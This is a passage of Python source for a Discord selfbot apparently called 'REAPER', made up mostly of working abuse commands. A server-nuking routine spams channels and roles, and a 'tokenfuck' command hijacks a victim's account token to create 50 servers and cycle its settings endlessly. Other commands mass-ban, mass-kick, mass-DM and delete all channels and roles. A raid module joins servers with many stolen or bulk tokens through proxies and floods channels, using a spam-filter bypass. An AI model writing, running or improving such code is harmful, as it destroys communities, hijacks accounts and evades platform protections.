                                                continue
                                        if self.ctspam == True:
                                            try:
                                                name = random.choice(names)
                                                cc = await ctx.guild.create_category(name=f'{name}')
                                                self.printlog(f"Created a category channel \"{cc}\"")
                                            except Exception as e:
                                                print(e)
                                                continue
                                    except Exception as e:
                                        print(e)
                                        continue
                                    print(s.space+s.sblue+f"Created channels!")
                            loop_spamch = asyncio.get_event_loop()
                            loop_spamch.create_task(_spamch_())
                            loop_spamch.run_forever()
                        except Exception as e:
                            print(e)
                    elif self.spaminf == False:
                        amt = round (self.createchannelsamount)
                        names = list (self.channelnames)
                        for i in range(amt):
                            try:
                                if self.tcspam == True:
                                    try:
                                        name = random.choice(names)
                                        tchannel = await ctx.guild.create_text_channel(name=name)
                                        self.printlog(f"Created a text channel \"#{tchannel}\"")
                                        if self.sendmsgs == True:
                                            try:
                                                for m in self.messagessn:
                                                    await tchannel.send(f"{m}")
                                                end()
                                            except Exception as e:
                                                print(e)
                                                continue
                                            end()
                                    except Exception as e:
                                        print(e)
                                        continue
                                if self.vcspam == True:
                                    try:
                                        name = random.choice(names)
                                        cc = await ctx.guild.create_voice_channel(name=f'{name}')
                                        self.printlog(f"Created a voice channel \"{cc}\"")
                                    except Exception as e:
                                        print(e)
                                        continue
                                if self.ctspam == True:
                                    try:
                                        name = random.choice(names)
                                        cc = await ctx.guild.create_category(name=f'{name}')
                                        self.printlog(f"Created a category channel \"{cc}\"")
                                    except Exception as e:
                                        print(e)
                                        continue
                            except Exception as e:
                                print(e)
                                continue
                            print(s.space+s.sblue+f"Created channels!")
                if self.spamrolesen == True:
                    amt = self.spamrolesamount
                    names = self.rolesnames
                    rancol = self.rolesrandomcol
                    for i in range(amt):
                        try:
                            name = random.choice(names)
                            if rancol == True:
                                rr = await ctx.guild.create_role(name=name, color=RandomColor())
                            else:
                                rr = await ctx.guild.create_role(name=name)
                            self.printlog(f"Created a role \"{rr}\"")
                        except:
                            continue
                    print(s.space+s.sblue+f"Created roles!")
                print(s.space+s.red+f"Nuked [{ctx.guild.name}]")
                lognoPrint(f"Nuked [{ctx.guild.name}]")
            else:
                await m.delete()
                await ctx.send("\\❌ Destroy server cancelled.", delete_after=4)
                return
        except asyncio.TimeoutError:
            await ctx.send("\\❌ **Error**: Took too long to answer.", delete_after=4)
            await m.delete()
            return

class AbuseCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(pass_context=True, aliases=['tokenfucker', 'disable', 'crash']) 
    async def tokenfuck(self, ctx, *, _token):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        locales = [ 
            "da", "de",
            "en-GB", "en-US",
            "es-ES", "fr",
            "hr", "it",
            "lt", "hu",
            "nl", "no",
            "pl", "pt-BR",
            "ro", "fi",
            "sv-SE", "vi",
            "tr", "cs",
            "el", "bg",
            "ru", "uk",
            "th", "zh-CN",
            "ja", "zh-TW",
            "ko"
        ]
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
            'Content-Type': 'application/json',
            'Authorization': _token,
        }
        request = requests.Session()
        payload = {
            'theme': "light",
            'locale': "ja",
            'message_display_compact': False,
            'inline_embed_media': False,
            'inline_attachment_media': False,
            'gif_auto_play': False,
            'render_embeds': False,
            'render_reactions': False,
            'animate_emoji': False,
            'convert_emoticons': False,
            'enable_tts_command': False,
            'explicit_content_filter': '0',
            'status': "invisible"
        }
        guild = {
            'channels': None,
            'icon': None,
            'name': "REAPER",
            'region': "europe"
        } 
        for _i in range(50):
            requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
            else:
                break
        modes = cycle(["light", "dark"])
        statuses = cycle(["online", "idle", "dnd", "invisible"])
        while True:
            setting = {
                'theme': next(modes),
                'locale': random.choice(locales),
                'status': next(statuses)
            }
            while True:
                try:
                    request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
                except Exception as e:
                    print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
                else:
                    break

    @commands.command(pass_context=True)
    async def dmall(self, ctx, *, message):
        if await disableCmd(ctx) == 0: return
        try:
            await ctx.message.delete()
            m = await ctx.guild.fetch_members(limit=49).flatten()
            print(str(m))
            for user in m:
                #if user == reaper.user:
                #    continue
                try:
                    await user.send(message)
                    await asyncio.sleep(3)
                    print(s.space+f"{c.b}{Fore.GREEN}[DM-ALL]{Fore.WHITE}: Messaged {Fore.YELLOW}{user}{Fore.WHITE}.")
                except discord.Forbidden:
                    print(s.space+f"{c.b}{Fore.RED}[ERROR]{Fore.WHITE}: Unable to message {Fore.YELLOW}{user}{Fore.WHITE} (Forbidden)")
                    continue
                except discord.HTTPException:
                    print(s.space+f"{c.b}{Fore.RED}[ERROR]{Fore.WHITE}: Unable to message {Fore.YELLOW}{user}{Fore.WHITE} (HTTPException)")
                    continue
                except Exception as e:
                    print(s.space+f"{c.b}{Fore.RED}[ERROR]{Fore.WHITE}: Unable to message {Fore.YELLOW}{user}{Fore.WHITE} (Unknown)")
                    continue
        except Exception as e:
            print(e)
        cmdused('dmall')

    @commands.command(pass_context=True)
    async def massban(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.ban()
            except:
                pass
        cmdused('massban')

    @commands.command(pass_context=True)
    async def masskick(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.kick()
            except:
                pass
        cmdused('masskick')

    @commands.command(pass_context=True)
    async def massrole(self, ctx, m: int = 50, n: str = RandString()):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        for _i in range(m):
            try:
                await ctx.guild.create_role(name=n, color=RandomColor())
                await asyncio.sleep(0.17)
            except:
                return
        cmdused('massrole')

    @commands.command(pass_context=True)
    async def masschannel(self, ctx, m: int = 50, n: str = RandString()):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        for _i in range(m):
            try:
                await ctx.guild.create_text_channel(name=n)
                await asyncio.sleep(0.17)
            except:
                return
        cmdused('masschannel')

    @commands.command(pass_context=True)
    async def delchannels(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
            except:
                return
        cmdused('delchannels')

    @commands.command(pass_context=True)
    async def delroles(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
            except:
                pass
        cmdused('delroles')

    @commands.command(pass_context=True)
    async def massunban(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        banlist = await ctx.guild.bans()
        for users in banlist:
            try:
                await asyncio.sleep(2)
                await ctx.guild.unban(user=users.user)
            except:
                pass
        cmdused('massunban')

class Raid(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.cfg = config["RaidSettings"]
        self.sproxy = self.cfg["ProxySettings"]
        self.rtimeout = float (self.cfg["RequestTimeout"])
        self.proxyfile = self.sproxy["ProxyFile"]
        self.proxyfile: str
        self.proxytype = self.sproxy["ProxyType"]
        self.proxytype: str
        self.proxyauth = self.sproxy["ProxyAuth"]
        self.proxyauth: int
        self.pauthcfg = self.sproxy["ProxyAuthSettings"]
        self.pauser = self.pauthcfg["User"]
        self.papass = self.pauthcfg["Pass"]
        self.sspam = self.cfg["SpamSettings"]
        self.timeout = self.sspam["Timeout"]
        self.defmsg = self.sspam["DefaultMsg"]
        self.defamt = self.sspam["DefaultAmount"]
        self.useproxies = bool (self.sproxy["UseProxies"])
        self.endpoint = (self.cfg["Endpoint"] + ".") if (self.cfg["Endpoint"] != "stable") else ""

    global deadproxies, currentwork
    deadproxies = []
    currentwork = None

    def checkauthor(self, client: commands.Bot, ctx):
        if ctx.author.id != client.user.id: return -1
        else: return 0

    def randproxy(self):
        try:
            with open(self.proxyfile, "r") as f:
                c = f.read().splitlines()
            if len(c) == 0:
                txt = self.proxyfile
                print(" "*2+s.red+f"{Fore.LIGHTBLACK_EX}RAID{Fore.LIGHTWHITE_EX}: Error: {Style.DIM}{Fore.WHITE}No proxies found in \"{txt}\"{Style.BRIGHT}")
                return -1
            def check():
                x = random.choice(c)
                if x not in deadproxies:
                    return x
                else:
                    check()
            x = check()
            return x
        except:
            open(self.proxyfile, "w")
            txt = self.proxyfile
            print(" "*2+s.red+f"{Fore.LIGHTBLACK_EX}RAID{Fore.LIGHTWHITE_EX}: {Style.DIM}{Fore.WHITE}Created \"{txt}\"{Style.BRIGHT}")
            return -1
        
    def write_error(self, token, error, code):
        sepr = f"{Style.DIM}{Fore.WHITE}|{Style.BRIGHT}"
        t = token.split(".")[0]
        print(" "*2+s.red+f"{Fore.LIGHTBLACK_EX}RAID{Fore.LIGHTWHITE_EX}: {Fore.LIGHTYELLOW_EX}{t}... {sepr} Error: {Style.DIM}{Fore.WHITE}{error}{Style.BRIGHT} ({Style.DIM}{code}{Style.BRIGHT})")
        return 0

    def write_error_alt(self, proxy, error):
        sepr = f"{Style.DIM}{Fore.WHITE}|{Style.BRIGHT}"
        t = token.split(".")[0]
        print(" "*2+s.red+f"{Fore.LIGHTBLACK_EX}RAID{Fore.LIGHTWHITE_EX}: {Fore.LIGHTYELLOW_EX}{proxy} {sepr} Error: {Style.DIM}{Fore.WHITE}{error}{Style.BRIGHT}")
        return 0

    def write_success(self, token, link):
        sepr = f"{Style.DIM}{Fore.WHITE}|{Style.BRIGHT}"
        t = token.split(".")[0]
        print(" "*2+s.red+f"{Fore.LIGHTBLACK_EX}RAID{Fore.LIGHTWHITE_EX}: {Fore.LIGHTYELLOW_EX}{t}... {sepr} Joined: {Style.DIM}{Fore.WHITE}{link}{Style.BRIGHT}")
        return 0

    def setup_request(self, token):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
        }
        if currentwork != None:
            return headers, currentwork
        if self.useproxies == True:
            proxyorigin = self.randproxy()
            if self.proxyauth == 1:
                proxies = {
                    'http': f'{self.proxytype}://{self.pauser}:{self.papass}@{proxyorigin}',
                    'https': f'{self.proxytype}://{self.pauser}:{self.papass}@{proxyorigin}'
                }
            else:
                proxies = {
                    'http': f'{self.proxytype}://{proxyorigin}',
                    'https': f'{self.proxytype}://{proxyorigin}'
                }
        else:
            proxies = {
                "http": None,
                "https": None,
            }
        return headers, proxies

    def sendmessage(self, token: str, text: str, channel, server: int, emojispam: bool, antispambypass: bool, speed: float):
        headers, proxies = self.setup_request(token)
        if emojispam:
            text = ""
            while True:
                try:
                    if self.useproxies == True:
                        src = session.get(f"https://{self.endpoint}discord.com/api/v8/guilds/{server}/emojis", headers=headers, proxies=proxies, timeout=int(self.rtimeout))
                        
                        currentwork = proxies
                    else:
                        src = session.get(f"https://{self.endpoint}discord.com/api/v8/guilds/{server}/emojis", headers=headers, timeout=int(self.rtimeout))
                except Exception:
                    
                    currentwork = None
                    if self.useproxies == True:
                        proxies = self.randproxy()
                    else:
                        break
                else:
                    break
            for emoji in json.loads(src.content):
                if emoji['animated'] == True:
                    pass
                else:
                    text += f"<:{emoji['name']}:{emoji['id']}>"
            if channel == 'all':
                while True:
                    try:
                        if self.useproxies == True:
                            chanjson = session.get(f"https://{self.endpoint}discord.com/api/v8/guilds/{server}/channels", headers=headers, proxies=proxies, timeout=int(self.rtimeout))
                            
                            currentwork = proxies
                        else:
                            chanjson = session.get(f"https://{self.endpoint}discord.com/api/v8/guilds/{server}/channels", headers=headers, timeout=int(self.rtimeout))
                    except Exception:
                        
                        currentwork = None
                        if self.useproxies == True:
                            proxies = self.randproxy()
                        else:
                            break
                    else:
                        break
                if src.status_code == 401:
                    error = json.loads(src.content)
                    self.write_error(token, error['message'], error['code'])
                    return
                elif src.status_code == 404:
                    error = json.loads(src.content)
                    self.write_error(token, error['message'], error['code'])
                    return
                elif src.status_code == 403:
                    error = json.loads(src.content)
                    self.write_error(token, error['message'], error['code'])
                    return
                channellist = json.loads(chanjson.content)
                original = text
                while True:
                    text = original
                    if antispambypass:
                        text += " " + str(random.randint(1000,9999))
                    payload = {"content": text, "tts": False}
                    for channel in channellist:
                        if not channel['type'] == 0:
                            continue
                        else:
                            for m in [text[i:i+1999] for i in range(0, len(text), 1999)]:
                                while True:
                                    try:
                                        sleep(int(float(speed)))
                                        if self.useproxies == True:
                                            src = session.post(f"https://{self.endpoint}discord.com/api/v8/channels/{channel['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=int(self.rtimeout))
                                            
                                            currentwork = proxies
                                        else:
                                            src = session.post(f"https://{self.endpoint}discord.com/api/v8/channels/{channel['id']}/messages", headers=headers, json=payload, timeout=int(self.rtimeout))
                                    except Exception:
                                        
                                        currentwork = None
                                        if self.useproxies == True: 
                                            proxies = self.randproxy()
                                        else:
                                            break
                                    else:
                                        break
                                if src.status_code == 429:
                                    ratelimit = json.loads(src.content)
                                    sleep(float(ratelimit['retry_after']/1000))
                                elif src.status_code == 401:
                                    error = json.loads(src.content)
                                    self.write_error(token, error['message'], error['code'])
                                    return
                                elif src.status_code == 404:
                                    error = json.loads(src.content)
                                    self.write_error(token, error['message'], error['code'])
                                    return
                                elif src.status_code == 403:
                                    error = json.loads(src.content)
                                    self.write_error(token, error['message'], error['code'])
            else:
                original = text
                while True:
                    text = original
                    if antispambypass:
                        text += " " + str(random.randint(1000,9999))
                    payload = {"content": text, "tts": False}
                    for m in [text[i:i+1999] for i in range(0, len(text), 1999)]:
                        while True:
                            try:
                                sleep(int(float(speed)))
                                if self.useproxies == True:
                                    src = session.post(f"https://{self.endpoint}discord.com/api/v8/channels/{channel}/messages", headers=headers, json=payload, proxies=proxies, timeout=int(self.rtimeout))
                                    
                                    currentwork = proxies
                                else:
                                    src = session.post(f"https://{self.endpoint}discord.com/api/v8/channels/{channel}/messages", headers=headers, json=payload, timeout=int(self.rtimeout))
                            except Exception:
                                
                                currentwork = None
                                if self.useproxies == True:
                                    proxies = self.randproxy()
                                else:
                                    break
                            else:
                                break
                        if src.status_code == 429:
                            ratelimit = json.loads(src.content)
                            sleep(float(ratelimit['retry_after']/1000))
                        elif src.status_code == 401:
                            error = json.loads(src.content)
                            self.write_error(token, error['message'], error['code'])
                            return
                        elif src.status_code == 404:
                            error = json.loads(src.content)
                            self.write_error(token, error['message'], error['code'])
                            return
                        elif src.status_code == 403:
                            error = json.loads(src.content)
                            self.write_error(token, error['message'], error['code'])
        else:
            if channel == 'all':
                while True:
                    try:
                        if self.useproxies == True:
                            chanjson = session.get(f"https://{self.endpoint}discord.com/api/v8/guilds/{server}/channels",headers=headers, proxies=proxies, timeout=int(self.rtimeout))
                            
                            currentwork = proxies
                        else:
                            chanjson = session.get(f"https://{self.endpoint}discord.com/api/v8/guilds/{server}/channels",headers=headers, timeout=int(self.rtimeout))
                    except Exception:
                        
                        currentwork = None
                        if self.useproxies == True:
                            proxies = self.randproxy()
                        else:
                            break
                    else:
                        break
                channellist = json.loads(chanjson.content)
                original = text
                while True:
                    text = original
                    if antispambypass:
                        text += " " + str(random.randint(1000,9999))
                    payload = {"content": text, "tts": False}
                    for channel in channellist:
                        if not channel['type'] == 0:
                            continue
                        else:
                            while True:
                                try:
                                    sleep(int(float(speed)))
                                    if self.useproxies == True:
                                        src = session.post(f"https://{self.endpoint}discord.com/api/v8/channels/{channel['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=int(self.rtimeout))
                                        
                                        currentwork = proxies
                                    else:
                                        src = session.post(f"https://{self.endpoint}discord.com/api/v8/channels/{channel['id']}/messages", headers=headers, json=payload, timeout=int(self.rtimeout))
                                except Exception:
                                    
                                    currentwork = None
                                    if self.useproxies == True:
                                        proxies = self.randproxy()
                                    else:
                                        break
                                else:
                                    break
                            if src.status_code == 429:
                                ratelimit = json.loads(src.content)
                                sleep(float(ratelimit['retry_after']/1000))
                            elif src.status_code == 401:
                                error = json.loads(src.content)
                                self.write_error(token, error['message'], error['code'])
                                return
                            elif src.status_code == 404:
                                error = json.loads(src.content)
                                self.write_error(token, error['message'], error['code'])
                                return
                            elif src.status_code == 403:
                                error = json.loads(src.content)
                                self.write_error(token, error['message'], error['code'])

            else:
                original = text
                while True:
                    text = original
                    if antispambypass:
                        text += " " + str(random.randint(1000,9999))
                    payload = {"content": text, "tts": False}
                    while True:
                        try:
                            sleep(int(float(speed)))
                            if self.useproxies == True:
                                src = session.post(f"https://{self.endpoint}discord.com/api/v8/channels/{channel}/messages", headers=headers, json=payload, proxies=proxies, timeout=int(self.rtimeout))
                                
                                currentwork = proxies
                            else:
                                src = session.post(f"https://{self.endpoint}discord.com/api/v8/channels/{channel}/messages", headers=headers, json=payload, timeout=int(self.rtimeout))
                        except Exception:
                            
                            currentwork = None
                            if self.useproxies == True:
                                proxies = self.randproxy()
                            else:
                                break
                        else:
                            break
                    if src.status_code == 429:
                        ratelimit = json.loads(src.content)
                        sleep(float(ratelimit['retry_after']/1000))
                    elif src.status_code == 401:
                        error = json.loads(src.content)
                        self.write_error(token, error['message'], error['code'])
                        return
                    elif src.status_code == 404:
                        error = json.loads(src.content)
                        self.write_error(token, error['message'], error['code'])
                        return
                    elif src.status_code == 403:
                        error = json.loads(src.content)
                        self.write_error(token, error['message'], error['code'])

    def gettokens(self):
        try:
            with open(self.cfg["TokensTxtFile"], "r") as f:
                c = f.read().splitlines()
            if len(c) == 0:
                txt = self.cfg["TokensTxtFile"]
                print(" "*2+s.red+f"{Fore.LIGHTBLACK_EX}RAID{Fore.LIGHTWHITE_EX}: Error: {Style.DIM}{Fore.WHITE}No tokens found in \"{txt}\"{Style.BRIGHT}")
                return -1
            return list (c)
        except:
            open(self.cfg["TokensTxtFile"], "w")
            txt = self.cfg["TokensTxtFile"]
            print(" "*2+s.red+f"{Fore.LIGHTBLACK_EX}RAID{Fore.LIGHTWHITE_EX}: {Style.DIM}{Fore.WHITE}Created \"{txt}\"{Style.BRIGHT}")
            return -1

    @commands.command()
    async def raidspam(self, ctx, amt: int = None, *, message: str = None):
        try:
            if self.checkauthor(reaper, ctx) == -1: return
            if amt == None: amt = self.defamt
            if message == None: message=self.defmsg
            if await disableCmd(ctx) == 0: return
            try: await ctx.message.delete()
            except: pass
            _delay = self.timeout
            #await ctx.send(message)
            sent = 0
            def smsg(m: int, token: str):
                for i in range(m):
                    self.sendmessage(token, message, ctx.channel.id, ctx.guild.id, False, False, _delay)
                    try: sleep(_delay)
                    except: pass
                sent += 1
                return
            #if __name__ == '__main__':
            #    proc = Process(target=smsg, args=(amt, _token,))
            #    proc.start()
            for _token in self.gettokens():
                loop = asyncio.get_event_loop()
                loop.create_task(smsg(amt, _token))
                loop.run_forever()
                while True:
                    if sent != amt: pass
                    else: break
                loop.stop()
        except Exception as e:
            print(e)
        cmdused("raidspam")
    
    @commands.command()
    async def raidjoin(self, ctx, *, invite_link: str):
        try:
            if self.checkauthor(reaper, ctx) == -1: return
            if await disableCmd(ctx) == 0: return
            try: await ctx.message.delete()
            except: pass

            tokens = self.gettokens()
            joined = 0
            if tokens == -1:
                prox = self.randproxy()
                if prox == -1:
                    return
                return
            
            def getinvite():
                # Escape Required: . + * ? [] $ ^ () {} | \
                try: 
                    invl = re.findall("[.]gg/(\w+)", invite_link)[0]
                    return invl
                except: 
                    invl = invite_link
                    return invl

            def getserver():
                headers, proxies = self.setup_request(token)
                try:
                    #if self.useproxies == True:
                    #    server = session.get(f"https://{self.endpoint}discord.com/api/v8/invites/{getinvite()}", headers={"Content-Type": "application/json"}, proxies=proxies, timeout=int(self.rtimeout))
                    #else:
                    server = session.get(f"https://{self.endpoint}discord.com/api/v8/invites/{getinvite()}", headers={"Content-Type": "application/json"}, timeout=int(self.rtimeout))
                    
                    currentwork = proxies
                    return server.json()["guild"]["name"]
                except:
                    
                    currentwork = None
                    self.write_error_alt(proxies["https"], "Dead proxy, retrying...")
                    getserver()

            server = getserver() or getinvite()
            print(" "*2+s.syellow+f"{Fore.LIGHTBLACK_EX}RAID{Fore.LIGHTWHITE_EX}: {Style.DIM}{Fore.WHITE}Making {len(tokens)} tokens join... {server}{Style.BRIGHT}")

            async def join(token, link):
                success = []
                headers, proxies = self.setup_request(token)
                k = True
                if (k == False):
                    pass
                else:
                    try:
                        if self.useproxies == True:
                            src = session.post(f"https://{self.endpoint}discord.com/api/v8/invites/{link}", headers=headers, proxies=proxies, timeout=int(self.rtimeout))
                            
                            currentwork = proxies
                            print(str(currentwork))
                        else:
                            src = session.post(f"https://{self.endpoint}discord.com/api/v8/invites/{link}", headers=headers, timeout=int(self.rtimeout))
                        if src.status_code == 401:
                            error = json.loads(src.content)
                            self.write_error(token, error['message'], error['code'])
                            return
                        elif src.status_code == 404:
                            error = json.loads(src.content)
                            self.write_error(token, error['message'], error['code'])
                            return
                        elif src.status_code == 403:
                            error = json.loads(src.content)
                            self.write_error(token, error['message'], error['code'])
                            return
                        success.append(token)
                        self.write_success(token, server)
                    except Exception as e:
                        self.write_error_alt(proxies["https"], "Dead proxy, retrying...")
                        
                        currentwork = None
                        await join(token, link)
                    return

            if tokens != -1:
                for _token in tokens:
                    try:
                        await join(_token, getinvite())
                        joined += 1
                        await asyncio.sleep(float(self.cfg["RaidJoinDelay"]))
                    except Exception as e:
                        print(e)
            print(" "*2+s.sgreen+f"{Fore.LIGHTWHITE_EX}RAID{Fore.LIGHTWHITE_EX}: {Style.DIM}{Fore.WHITE}Successfully made {joined} tokens join {server}{Style.BRIGHT}")
        except Exception as e:
            print (e)

        cmdused("raidjoin")

class RaidNoPerms(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def randomping(self, ctx, indefinite: bool = False, amount: int = 25):
        if await disableCmd(ctx) == 0: return
        def pings():
            members = ctx.guild.members
            p = []
            for i in range(5):
                p.append(random.choice(members).mention)
            return p
        async def sendMsg():
            await ctx.send(str ( pings() ) )
        if indefinite == True:
            loop = asyncio.get_event_loop()
            loop.create_task(sendMsg())
            loop.run_forever()
            cmdused("randomping")
        else:
            for i in range(amount):
                await sendMsg()
            cmdused("randomping")

    @commands.command(aliases=["sendallchannels", "allchannelsend", "send-all-channels"])
    async def sendallch(self, ctx, indefinite: bool = False, *, message: str = "hi there"):
        if await disableCmd(ctx) == 0: return
        async def sendMsg():
            for channel in ctx.guild.channels:
                try:
                    await channel.send (str ( message ) )
                except:
                    continue
        if indefinite == True:
            loop = asyncio.get_event_loop ()
            loop.create_task ( sendMsg () )
            loop.run_forever ()
            cmdused ( "sendallchannels" )
        else:
            await sendMsg ()
            cmdused ( "sendallchannels" )

class AnimCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.cmdused = lambda m: cmdused(m.message.content.split(prefix)[1].split(" ")[0])

    @commands.command()
    async def hack(self, ctx, *, user):
        if await disableCmd(ctx) == 0: return
        try:
            if user == None: 
                user = ctx.author
            else: 
                def get_user_from_global_cache(user):
                    for u in self.bot.users:
                        if user == u.name:
                            return user
                user = user
                if type(user) != discord.Member:
                    user = str(user)
                    r = re.compile(r"@(.*#\d{4})|(\d{18})")
                    r = r.search(user)
                    if r:
                        if r.group(2):
                            user = int(r.group(2))
                        elif r.group(1):
                            user = r.group(1)
                if type(user) == str and type(user) != int: user = ctx.guild.get_member_named(user)
                if type(user) == str: user = get_user_from_global_cache(user)
                elif type(user) == int: user = await self.bot.fetch_user(user)
        except:
            user = ctx.author
        await ctx.message.delete()
        msg = await ctx.send(f'⌛ Hacking started for user {user.name}.')
        await asyncio.sleep(2)
        await msg.edit(content='⏳ Getting user\'s email...')
        await asyncio.sleep(2)
        await msg.edit(content='⌛ Fetching login (token found)...')
        await asyncio.sleep(2)
        await msg.edit(content='⏳ Fetching user\'s DMs...')
        await asyncio.sleep(2)
        await msg.edit(content='⌛ Tracing user\'s IP from messages...')
        await asyncio.sleep(2)
        await msg.edit(content='⏳ Last DM: `stop pinging`')
        await asyncio.sleep(2)
        await msg.edit(content='⌛ Finding most used feature in discord...')
        await asyncio.sleep(2)
        await msg.edit(content='⏳ Most used feature: `Selfbots`')
        await asyncio.sleep(2)
        await msg.edit(content='⏳ Reporting to discord for reason: `Selfbotting`')
        await asyncio.sleep(2)
        await msg.edit(content='⌛ Injecting threats `Trojan:Win32/Ymacco.AA53`, `Trojan:Win32/Wacatac.D5!ml` and `HackTool:Win32/Keygen`...')
        await asyncio.sleep(2)
        await msg.edit(content='⏳ Injected `Trojan:Win32/Wacatac.D5!ml`... (Status: `High`)')
        await asyncio.sleep(2)
        await msg.edit(content='⌛ Injected `Trojan:Win32/Ymacco.AA53`... (Status: `Severe`)')
        await asyncio.sleep(2)
        await msg.edit(content='⏳ Injected `HackTool:Win32/KeyGen`... (Status: `Very High`)')
        await asyncio.sleep(2)
        await msg.edit(content='⌛ Found AppData information... Nitro Stolen...')
        await asyncio.sleep(2)
        await msg.edit(content='⏳ Selling data to goverment')
        await asyncio.sleep(2)
        await msg.edit(content=f'⌛ Getting house dox with discriminator of #{user.discriminator}')
        await asyncio.sleep(2)
        await msg.edit(content=f'⌛ Email: **{user.name}h@gmail.com**\nPassword: **\\*\\*\\*\\*\\*\\*\\***')
        await asyncio.sleep(1)
        await msg.edit(content=f'✅ User has been hacked! Login info saved in console.', delete_after=delinterval)
        cmdused("hack")

    @commands.command()
    async def virus(self, ctx, user = None, *, virus: str = "trojanWare"):
        if await disableCmd(ctx) == 0: return
        user = user or ctx.author.name
        await ctx.message.delete()
        list_ = (
            f"`[ ▓              ] / {virus}.exe Packing files.`",
            f"`[ ▓▓▓            ] - {virus}.exe Packing files..`",
            f"`[ ▓▓▓▓▓▓         ] \\ {virus}.exe Packing files..`",
            f"`[ ▓▓▓▓▓▓▓        ] | {virus}.exe Packing files..`",
            f"`[ ▓▓▓▓▓▓▓▓▓▓▓    ] / {virus}.exe Packing files..`",
            f"`[ ▓▓▓▓▓▓▓▓▓▓▓▓▓  ] - {virus}.exe Packing files..`",
            f"`[ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] \\ {virus}.exe Packing files..`",
            f"Successfully downloaded `{virus}.exe`",
            "`Injecting virus.   |`",
            "`Injecting virus..  /`",
            "`Injecting virus... -`",
            "`Injecting virus.   \\`",
            "`Injecting virus..  |`",
            f"Successfully Injected {virus}.exe into {user}",
        )
        msg = await ctx.send("",delete_after=delinterval)
        for i in list_:
            await asyncio.sleep(1.25)
            await msg.edit(content=i)
        cmdused('virus')

    @commands.command()
    async def cathi(self, ctx, *, text: str = "Hi..."):
        if await disableCmd(ctx) == 0: return
        list = (
            '_ _ 　　　\＿\＿\_\＿\＿   \n'+
            '　　／　／　  ／|" \n'+
            '　　|￣￣￣￣|　|  \n'+
            '　　|　　　　|／   \n'+
            '　　￣￣￣￣       \n',
            f'_ _  　　　{text} \n'+
             ' 　   　 ∧＿∧＿_   \n'+
             '　　／(´･ω･`)  ／＼ \n'+
             '　／|￣￣￣￣|＼／  \n'+
             '　　|　　　　|／    \n'+
             '　　￣￣￣￣        \n',
        )
        self.cmdused(ctx)
        for i in range(7):
            for cat in list:
                await ctx.message.edit(content=cat)
                await asyncio.sleep(1.5)

    @commands.command()
    async def flop(self, ctx):
        if await disableCmd(ctx) == 0: return
        list = (
            "(   ° - °) (' - '   )",
            "(\\\° - °)\ (' - '   )",
            "(—°□°)— (' - '   )",
            "(╯°□°)╯(' - '   )",
            "(╯°□°)╯︵(\\\ .o.)\\",
        )
        self.cmdused(ctx)
        for i in list:
            await asyncio.sleep(1.5)
            await ctx.message.edit(content=i)

    @commands.command()
    async def poof(self, ctx):
        if await disableCmd(ctx) == 0: return
        """poofness"""
        list = ("(   ' - ')", "' - ')", "- ')", "')", ")", "*poofness*")
        self.cmdused(ctx)
        for i in list:
            await asyncio.sleep(1.5)
            await ctx.message.edit(content=i)

    @commands.command()
    async def selfdesctruct(self, ctx, *, amt: int = 5):
        if await disableCmd(ctx) == 0: return
        self.cmdused(ctx)
        list_ = []
        while amt != 0:
            list_.append(f"```THIS MESSAGE WILL SELF DESTRUCT IN {amt} SECONDS```")
            amt -= 1
        list_.append("💣")
        list_.append("💥")
        for i in list_:
            await asyncio.sleep(1.5)
            await ctx.message.edit(content=i)

    @commands.command()
    async def bomb(self, ctx):
        if await disableCmd(ctx) == 0: return
        _l = [
            "💣~~--------------------~~🔥",
            "💣~~------------------~~🔥",
            "💣~~----------------~~🔥",
            "💣~~--------------~~🔥",
            "💣~~------------~~🔥",
            "💣~~----------~~🔥",
            "💣~~--------~~🔥",
            "💣~~------~~🔥",
            "💣~~----~~🔥",
            "💣~~--~~🔥",
            "💥"
        ]
        self.cmdused(ctx)
        a = await ctx.send(_l[0])
        await ctx.message.delete()
        for l in _l:
            if l == _l[0]: 
                continue
            else:
                await asyncio.sleep(1.75)
                await a.edit(content=l)
        await asyncio.sleep(2.2)
        await a.delete()

    @commands.command()
    async def tableflipped(self, ctx):
        if await disableCmd(ctx) == 0: return
        list = (
            "`(\°-°)\  ┬─┬`",
            "`(\°□°)\  ┬─┬`",
            "`(-°□°)-  ┬─┬`",
            "`(╯°□°)╯    ]`",
            "`(╯°□°)╯     ┻━┻`",
            "`(╯°□°)╯       [`",
            "`(╯°□°)╯          ┬─┬`",
            "`(╯°□°)╯                 ]`",
            "`(╯°□°)╯                  ┻━┻`",
            "`(╯°□°)╯                         [`",
